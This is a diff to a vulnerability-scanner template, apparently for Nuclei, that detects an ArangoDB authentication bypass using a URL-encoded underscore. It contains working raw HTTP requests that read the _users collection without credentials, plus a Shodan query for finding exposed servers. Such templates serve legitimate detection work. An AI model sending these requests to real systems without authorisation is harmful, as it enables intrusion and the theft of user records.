@@ -1,5 +1,4 @@
 id: arangodb-auth-bypass
-
 info:
   name: ArangoDB - Authentication Bypass via URL-Encoded Underscore (%5f) to RCE
   author: DhiyaneshDk
@@ -19,15 +18,14 @@ info:
     cvss-score: 9.8
     cwe-id: CWE-287
   metadata:
-    verified: true
+    runzero-match: any(each(service["html.titles"]), {# matches "^ArangoDB Web Interface$"})
     max-request: 2
-    vendor: arangodb
     product: arangodb
     shodan-query: http.title:"ArangoDB Web Interface"
-  tags: arangodb,auth-bypass,rce,ghsa
-
+    vendor: arangodb
+    verified: true
+  tags: arangodb,auth-bypass,ghsa,rce
 flow: http(1) && http(2)
-
 http:
   - raw:
       - |
@@ -36,13 +34,11 @@ http:
         Content-Type: application/json
 
         {"collection":"_users","example":{}}
-
     matchers:
       - type: dsl
         dsl:
           - 'status_code == 401'
         internal: true
-
   - raw:
       - |
         PUT /_db/_system/%5fapi/simple/first-example HTTP/1.1
@@ -50,13 +46,11 @@ http:
         Content-Type: application/json
 
         {"collection":"_users","example":{}}
-
     unsafe: true
-
     matchers:
       - type: dsl
         dsl:
           - 'contains(body, "\"document\"") && contains(body, "_users/") && contains(body, "\"error\":false")'
           - 'status_code == 200'
         condition: and
-# digest: 490a004630440220584094bcd30279b5b231bc65386ed73f8264210933de6dc6bef277d8161acc8402205e2fff66f431ecd6a9adb471ff20ca4cfee3998adb17ab6ccc30e7fb46774b5d:922c64590222798bb761d5b6d8e72950
+        # digest: 490a004630440220584094bcd30279b5b231bc65386ed73f8264210933de6dc6bef277d8161acc8402205e2fff66f431ecd6a9adb471ff20ca4cfee3998adb17ab6ccc30e7fb46774b5d:922c64590222798bb761d5b6d8e72950
